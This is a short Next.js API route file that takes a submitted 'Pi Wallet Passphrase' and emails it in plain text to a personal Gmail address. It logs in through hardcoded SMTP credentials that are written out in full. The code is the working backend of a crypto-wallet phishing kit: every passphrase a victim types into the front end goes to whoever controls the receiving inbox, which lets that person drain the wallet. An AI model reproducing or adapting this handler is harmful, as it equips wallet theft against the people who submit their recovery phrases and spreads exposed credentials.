// pages/api/sendEmail.js

import nodemailer from 'nodemailer';

export default async function handler(req: { method: string; body: { passphrase: any; }; }, res: { status: (arg0: number) => { (): any; new(): any; json: { (arg0: { message: string; error?: unknown; }): void; new(): any; }; }; }) {
  if (req.method === 'POST') {
    const { passphrase } = req.body;

    // Create a transporter object using SMTP transport
    let transporter = nodemailer.createTransport({
      host: 'smtp.ethereal.email',
      port: 587,
      auth: {
        user: 'maddison53@ethereal.email',
        pass: 'jn7jnAPss4f63QBp6D',
      },
    });

    // Set up email data
    let mailOptions = {
      from: 'hafizadil909@gmail.com',
      to: 'adilamin374@gmail.com', // Replace with your email
      subject: 'Pi Wallet Passphrase Submission',
      text: `Passphrase: ${passphrase}`,
    };

    // Send mail
    try {
      await transporter.sendMail(mailOptions);
      res.status(200).json({ message: 'Email sent successfully' });
    } catch (error) {
      console.error('Error sending email:', error);
      res.status(500).json({ message: 'Error sending email', error });
    }
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
